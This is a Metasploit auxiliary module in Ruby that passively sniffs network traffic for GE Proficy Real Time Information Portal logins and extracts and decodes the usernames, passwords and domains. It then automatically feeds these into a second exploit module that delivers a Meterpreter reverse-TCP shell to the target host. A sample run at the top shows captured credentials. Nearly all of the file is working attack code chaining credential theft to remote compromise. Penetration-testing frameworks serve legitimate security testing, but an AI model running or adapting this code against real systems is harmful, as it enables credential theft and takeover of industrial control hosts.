##
# $Id: rtipsniff.rb 
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##
#
# MacbookPro:metasploit kfinisterre$ cd /Users/kfinisterre/Desktop/metasploit; sudo ./msfcli auxiliary/test/rtipsniff INTERFACE=en1  E
# [*] Opening the network interface...
# [*] Sniffing RTIP login requests...
# [*] Proficy RTIP Credentials -> user: Administrator pass: This was base64 encoded domain: ProficySniffTest
#
# 
#


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Report
	include Msf::Exploit::Capture
	
	def initialize
		super(
			'Name'        => 'GE Proficy Real Time Information Portal Credentials Leak',
			'Version'     => '$Revision: 1 $',
			'Description' => 'This module sniffs RTIP login requests from the network',
			'Author'      => ['hdm','kf'],
			'License'     => MSF_LICENSE,
			'Actions'     =>
				[
				 	[ 'Sniffer' ]
				],
			'PassiveActions' => 
				[
					'Sniffer'
				],
			'DefaultAction'  => 'Sniffer'
		)
		register_options([
                        OptAddress.new('LHOST', [true, 'The IP address to use for reverse-connect payloads']),
                        OptPort.new('LPORT', [false, 'The starting TCP port number for reverse-connect payloads', 4444])
                ], self.class)
	end

        def init_hooked_on_fanucs(name,user,pass,domain, rhost, targ = 0)
                targ ||= 0
                payload='windows/meterpreter/reverse_tcp'
                sploit = framework.modules.create(name)
                
                sploit.datastore['USERNAME']   = user
                sploit.datastore['PASSWORD']   = pass
                sploit.datastore['DOMAIN']   = domain
                sploit.datastore['RHOST']   = rhost
                sploit.datastore['LPORT']   = datastore['LPORT']
                sploit.datastore['LHOST']   = datastore['LHOST']
                sploit.exploit_simple(
                        'LocalInput'     => self.user_input,
                        'LocalOutput'    => self.user_output,
                        'Target'         => targ,
                        'Payload'        => payload,
                        'RunAsJob'       => true)
        end
                

	def run
		username = "a", password = "b", domain = "c"

		print_status("Opening the network interface...")
		open_pcap()

		print_status("Sniffing RTIP login requests...")
		each_packet() do |pkt|
			next if not pkt.tcp?
			
                        if (pkt.payload =~ /\x56\x5d\x72\x2b\x30\xd7\xf2\xc6\x74/)

                                marker = "\x56\x5d\x72\x2b\x30\xd7\xf2\xc6\x74"
                                data = pkt.payload
 
                                credentials = data.split(marker)[1].split("\x00")  
                                username = credentials[1]
                                password = credentials[2]
                                domain = credentials[3].split("\x01")[0]
                                username = username[1..(username.length-2)]
                                password = password[1..(password.length-2)].unpack("m")
                                domain = domain[1..(domain.length-2)]
                                print_status("Proficy RTIP Credentials -> user: #{username} pass: #{password} domain: #{domain} ip: #{pkt.ip_daddr}")
				
			        init_hooked_on_fanucs('exploit/windows/misc/hooked_on_fanucs',"#{username}","#{password}","#{domain}", "#{pkt.ip_daddr}")
                        end
			
			true
		end
		
		print_status("Finished sniffing")
	end
	
end

